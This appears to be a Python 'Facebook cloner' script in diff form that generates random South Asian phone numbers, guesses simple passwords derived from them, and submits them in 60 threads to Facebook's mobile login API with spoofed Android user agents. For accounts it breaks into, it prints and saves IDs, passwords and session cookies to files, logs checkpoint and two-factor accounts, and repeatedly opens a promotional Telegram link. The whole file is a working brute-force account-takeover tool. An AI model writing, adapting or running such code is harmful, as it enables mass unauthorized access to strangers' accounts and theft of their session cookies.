+#------------------[ VERSION ]-----------------#
+version = '1.07'
+#------------------[ LOOP ]-----------------#
+ok = [];cp = [];twf = [];lop = 0;xode = [];plist = [];cpx = [];cokix = [];apkx = [];paswtrh = [];rcd = [];rcdx = [];ugen = [];ugtn = [];ugxn = [];lk = [];togg = []
+#------------------[ CLEAR ]-----------------#
+def clear():os.system("clear");print(logo)
+#------------------[ LINE ]-----------------#
+def line():print('===============================================')
+#------------------[ DEVICE ]-----------------#
+xxxxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
+gtxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
+gt = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820')
+#------------------[ WEB ]-----------------#
+fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
+#------------------[ INSTALL ]-----------------#
+os.system('pkg install sox -y')
+os.system('pkg install espeak')
+os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
+os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
+os.system('clear');os.system('espeak -a 300 "well,come to,kalyan, King send script free open tool"')
+#------------------[ DATE ]-----------------#
+dateti = str(datetime.now()).split(' ')[0]
+#------------------[ PROXY ]-----------------#
+proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+open('socksku.txt', 'w').write(proxylist)
+proxsi = open('socksku.txt', 'r').read().splitlines()
+#------------------[ KEY ]-----------------#
+
+#------------------[ DATE-CHECKER ]-----------------#
+def tutulx(fx):
+    if len(fx) == 15:
+        if fx[:10] in ['1000000000']:
+            tutulxz = '2009'
+            return tutulxz
+        if fx[:9] in ['100000000']:
+            tutulxz = '2009'
+            return tutulxz
+        if fx[:8] in ['10000000']:
+            tutulxz = '2009'
+            return tutulxz
+        if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
+            tutulxz = '2009'
+            return tutulxz
+        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
+            tutulxz = '2010'
+            return tutulxz
+        if fx[:6] in ['100001']:
+            tutulxz = '2010/2011'
+            return tutulxz
+        if fx[:6] in ['100002', '100003']:
+            tutulxz = '2011/2012'
+            return tutulxz
+        if fx[:6] in ['100004']:
+            tutulxz = '2012/2013'
+            return tutulxz
+        if fx[:6] in ['100005', '100006']:
+            tutulxz = '2013/2014'
+            return tutulxz
+        if fx[:6] in ['100007', '100008']:
+            tutulxz = '2014/2015'
+            return tutulxz
+        if fx[:6] in ['100009']:
+            tutulxz = '2015'
+            return tutulxz
+        if fx[:5] in ['10001']:
+            tutulxz = '2015/2016'
+            return tutulxz
+        if fx[:5] in ['10002']:
+            tutulxz = '2016/2017'
+            return tutulxz
+        if fx[:5] in ['10003']:
+            tutulxz = '2018/2019'
+            return tutulxz
+        if fx[:5] in ['10004']:
+            tutulxz = '2019'
+            return tutulxz
+        if fx[:5] in ['10005']:
+            tutulxz = '2020'
+            return tutulxz
+        if fx[:5] in ['10006', '10007', '10008']:
+            tutulxz = '2021/2022'
+            return tutulxz
+        tutulxz = '2023'
+        return tutulxz
+    if len(fx) in [9, 10]:
+        tutulxz = '2008/2009'
+        return tutulxz
+    if len(fx) == 8:
+        tutulxz = '2007/2008'
+        return tutulxz
+    if len(fx) == 7:
+        tutulxz = '2006/2007'
+        return tutulxz
+    tutulxz = '2023/2024'
+    return tutulxz
+#------------------[ SIM-CODE ]-----------------#
+BDX = f'''\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mBD SIM CODE \x1b[10;91m• {G}013 014 015 016 017 018 019{E}{W}'''
+INDX = f'''{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}'''
+PAKX = f'''{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}'''
+#------------------[ LIMIT ]-----------------#
+LIMITX = f'''[{G}+{W}] EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}'''
+#------------------[ YES/NO ]-----------------#
+CPG = f'''[{G}+{W}] Do You Went Show Cp Account (y/n)'''
+CKIG = f'''[{G}+{W}] Do You Went Show Cookie (y/n)'''
+#------------------[ CHOICE/INPUT ]-----------------#
+chc = f'''[{G}+{W}] \x1b[10;92mCHOOSE \x1b[10;91m•\x1b[10;92m '''
+flp = f'''{W}[{G}•{W}] PUT FILE PATH\x1b[1;37m : {G}'''
+#------------------[ EXAMPLE-PASS ]-----------------#
+chcps = f'''EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'''
+#------------------[ METHOD ]-----------------#
+mxxt = f'''{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'''
+#------------------[ NOT-FOUND ]-----------------#
+nflp = f'''[{R}!{W}] FILE LOCATION NOT FOUND '''
+#------------------[ LOGO ]-----------------#
+logo = f'''\r\r\x1b[0;92m
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\x1b[10;91m ████████\x1b[0;92m ██    ██\x1b[10;91m ████████\x1b[0;92m ██    ██\x1b[10;91m ██ \x1b[0;92m     ║
+║\x1b[10;91m    ██ \x1b[0;92m   ██    ██\x1b[10;91m    ██\x1b[0;92m    ██    ██\x1b[10;91m ██  \x1b[0;92m    ║
+║\x1b[10;91m    ██ \x1b[0;92m   ██    ██\x1b[10;91m    ██\x1b[0;92m    ██    ██\x1b[10;91m ██  \x1b[0;92m    ║
+║\x1b[10;91m    ██ \x1b[0;92m   ██    ██\x1b[10;91m    ██\x1b[0;92m    ██    ██\x1b[10;91m ██   \x1b[0;92m   ║
+║\x1b[10;91m    ██ \x1b[0;92m    ██████\x1b[10;91m     ██\x1b[0;92m     ██████\x1b[10;91m  ███████\x1b[0;92m ║
+\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \x1b[0;92m
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+\x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m 
+\x1b[10;93m╠══[SEND BY                    • \x1b[1;38mKALYAN KING]     ║ 
+\x1b[10;91m╠══[TELIGERM                  • OX CYBER TEAM ]   ║    
+\x1b[10;97m╠══[Github                   • Tutul-King ]   ║   
+\x1b[10;94m╠══[Teligerm                  • https://t.me/+LRlET_sIrUcxMTk1 ]  ║ 
+\x1b[10;95m╠══[TOOLS                    • FREE ]         ║    
+\x1b[10;93m╠══[VERSION                  • 2.1 ]          ║ \x1b[10;92m
+\x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[1;31m'''
+#------------------[ NAME ]-----------------#
+#------------------[ MENU ]-----------------#
+def Main():
+    clear()
+    print('\x1b[10;92m┏━\x1b[10;97m=============================================')
+    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m] \x1b[10;92mRANDOM BANGLADESH CLONER \x1b[10;97m')
+    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m2\x1b[10;97m] \x1b[10;93mCONTACT WITH ADMIN')
+    print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m0\x1b[10;97m] \x1b[10;91mEXIT')
+    print('\x1b[10;92m┣━\x1b[10;97m=============================================')
+    os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
+    os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
+    ghx = input('\x1b[10;92m┗━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m:\x1b[10;92m ')
+    if ghx in ['A', 'a', '1']:rcd.append('1');rmenu1()
+    if ghx in ['B', 'b', '2']:rcd.append('2');rmenu1()
+    if ghx in ['C', 'c', '3']:rcd.append('3');rmenu1()
+    if ghx in ['C', 'c', '4']:rcd.append('4');rmenu1()
+    else:line();print(f'\n \t {R}Choose Valid Option{E}');time.sleep(1);Main()
+#------------------[ RANDOM-MENU ]-----------------#
+def rmenu1():
+    clear()
+    if '1' in rcd:print(f'{BDX}');line()
+    if '3' in rcd:print(f'{INDX}');line()
+    if '2' in rcd:print('                [10;92mAdmin Facebook idz');os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1');time.sleep(3)
+    code = input(f'{chc}');print(f'''\x1b[10;97m{'==============================================='}''');print(f'''{LIMITX}''');line();limit = int(input(f'[{G}+{E}] Limit : {G}'));print(f"{W}{'==============================================='}");print(f'{CPG}');line();cx = input(f'{chc}')
+    if cx in ['n', 'N', 'no', 'NO', '2']:cpx.append('n')
+    else:cpx.append('y')
+    print(f"{W}{'==============================================='}");print(f'{CKIG}');line();ckiv = input(f'{chc}')
+    if ckiv in ['n', 'N', 'no', 'NO', '2']:cokix.append('n')
+    else:cokix.append('y')
+    for number in range(limit):
+        if '1' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(8)));xode.append(numberx)
+        if '2' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(7)));xode.append(numberx)
+        if '3' in rcd:numberx = ''.join((random.choice(string.digits) for _ in range(6)));xode.append(numberx)
+    with ThreadPool(max_workers=60) as tonxoys:
+        tid = str(len(xode));clear()
+        print('\x1b[10;92m┏━\x1b[10;97m=============================================')
+        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[38;5;208m USER NAME\x1b[10;91m :\x1b[10;96m ')
+        print(f'''\x1b[10;92m┣━{W}[{G}+{W}] \x1b[10;91mYOUR TOTAL ID :\x1b[1;92m ''' + tid)
+        print(f'''\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[10;92m Started Time Date \x1b[10;91m: \x1b[10;93m{dateti}''')
+        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[38;5;208mUSE YOUR \x1b[10;95mAIRPLANE MODE \x1b[10;97m[\x1b[10;92mON\x1b[10;91m/\x1b[10;92mOFF\x1b[10;97m] \x1b[10;92mAFTER\x1b[10;91m-\x1b[10;92m3 MIN')
+        print('\x1b[10;92m┗━\x1b[10;97m=============================================')
+        for rngx in xode:
+            id = code + rngx
+            if '1' in rcd:psd = [id,rngx,id[:6],id[:7],id[:8],id[5:]]
+            if '2' in rcd:psd = [id,rngx,id[5:],'khan123']
+            if '3' in rcd:psd = [id,rngx,id[:6],'57273200']
+            tonxoys.submit(graphrm, id, psd, tid)
+#------------------[ METHOD-1 ]-----------------#
+def graphrm(id,psd,tid):
+    global ok,cp,lop
+    sys.stdout.write(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;97m[\x1b[10;92mTutul\x1b[10;97m-\x1b[10;92mM1\x1b[10;97m]>~[\x1b[10;92m{lop}\x1b[10;97m]>~<[\x1b[10;92m{tid}\x1b[10;97m]>~[\x1b[10;92mOK\x1b[10;91m•\x1b[10;92m%s\x1b[10;91m/\x1b[10;93m%s\x1b[10;97m] ''' % (len(ok), len(lk)));sys.stdout.flush()
+    for psw in psd:
+		vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
+        VAPP = random.randint(410000000, 499999999)
+        gtt = random.choice(xxxxx)
+        gttt = random.choice(xxxxx)
+        ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + '[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{density=3.3,width=1080,height=1430};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
+        datax = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': id, 'password': psw, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'en_GB': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
+        header = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+        twfx = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
+        lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False).json()
+        if 'session_key' in lo:
+            cki = lo['session_cookies']
+            ck = {}
+            for xk in cki:
+                ck.update({xk['name']: xk['value']})
+            coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
+            iid = re.findall('c_user=(.*);xs', coki)[0]
+            print(f'''\r\r\x1b[10;92m[Tutul-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{tutulx(iid)}''')
+            os.system('espeak -a 300 "Tutul,  Ok,  id"')
+            ok.append(id)
+            open('/sdcard/1T-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
+            if 'y' in cokix:
+                print(f'''\r\r\x1b[10;93m[🌺] \x1b[10;91m= \x1b[10;93mCOOKIES\x1b[10;91m •  \x1b[10;94m{coki}{E}''')
+                print(f'''\x1b[10;97m{'==============================================='}{E}''')
+            break
+        else:
+            if twfx in str(lo):
+                iid = lo['error']['error_data']['uid']
+                print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;96m[Tutul-2F] {iid} | {psw}{W}''')
+                os.system('espeak -a 300 \"2F\"')
+                open('/sdcard/1T-2F.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
+                twf.append(id)
+                break
+            if 'www.facebook.com' in lo['error']['message']:
+                iid = lo['error']['error_data']['uid']
+                if iid in ok:pass
+                if 'y' in cpx:
+                    print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[Tutul-Cp] {iid} | {psw}{W}''')
+                    cp.append(id)
+                    os.system('espeak -a 300 "Cp"')
+                    open('/sdcard/1T-CP.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
+                break
+            else:pass
+    lop += 1
+#------------------[ END-CALL ]-----------------#
+Main()
 	
